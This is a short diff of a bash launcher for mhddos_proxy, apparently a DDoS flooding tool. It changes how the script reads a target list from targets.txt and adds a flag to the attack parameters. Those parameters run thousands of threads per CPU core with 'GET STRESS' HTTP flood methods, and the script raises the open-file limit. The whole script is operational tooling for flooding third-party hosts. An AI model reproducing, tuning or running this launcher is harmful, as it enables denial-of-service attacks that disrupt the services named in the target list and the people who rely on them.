@@ -5,7 +5,7 @@
 
 # Config
 basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
-targets=($(cat ${basedir}/targets.txt | grep -v ^\# | grep -xv '' | xargs))
+targets=$(cat ${basedir}/targets.txt | grep -v ^\# | grep -xv '' | xargs)
 apt_req=(
   python3-virtualenv
   git
@@ -27,7 +27,7 @@ src_repo="https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git"
 src_dir="${basedir}/src"
 tmux_session_name="proxy"
 cpu_cores=$(nproc)
-mhddos_params="-t $((${cpu_cores} * 1000)) -p 1200 --rpc 2000 --http-methods GET STRESS --debug"
+mhddos_params="-t $((${cpu_cores} * 1000)) -p 1200 --rpc 2000 --http-methods GET STRESS --debug --table"
 
 # Tuning
 ulimit -n 1048576
